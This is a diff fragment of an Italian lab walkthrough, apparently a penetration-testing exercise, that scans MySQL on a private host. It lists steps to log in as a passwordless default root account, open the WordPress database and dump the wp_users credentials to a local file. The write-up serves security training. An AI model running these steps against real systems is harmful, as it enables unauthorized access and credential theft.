@@ -146,10 +146,15 @@ Eseguiamo ```nmap --script all -p3306 10.0.2.4```.
 RISULTATO: Dopo l' esecuzione dello script, si può vedere che è presente l' account di default *root* senza password.
 
 A questo punto seguiamo questa procedura per scaricare le credenziali disponibli dal database:
+
 **1)** Per accedere a mysql da remoto digitare  ```mysql -h 10.0.2.4 -u root ```.
+
 **2)** Digitare ```SHOW DATABASE``` per vedere i database disponibili.
+
 **3)** Digitare ```USE WORDPRESS``` per selezionare il database di wordpress (potrei trovare delle credenziali).
+
 **4)** Digitare ```SELECT * FROM wp_users` per cercare ionformazioni in questa tabella.
+
 **5)** Salviamo le credenziali su un file nel nostro pc.
 
 
